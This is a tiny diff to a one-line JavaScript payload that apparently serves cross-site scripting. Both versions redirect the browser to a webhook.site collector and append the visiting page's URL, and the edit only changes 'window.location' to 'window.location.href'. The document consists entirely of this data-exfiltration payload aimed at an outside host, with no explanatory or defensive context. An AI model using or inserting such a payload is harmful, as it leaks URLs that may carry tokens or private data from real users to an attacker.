@@ -1,1 +1,1 @@
-location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c=" + window.location;
+location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c=" + window.location.href;
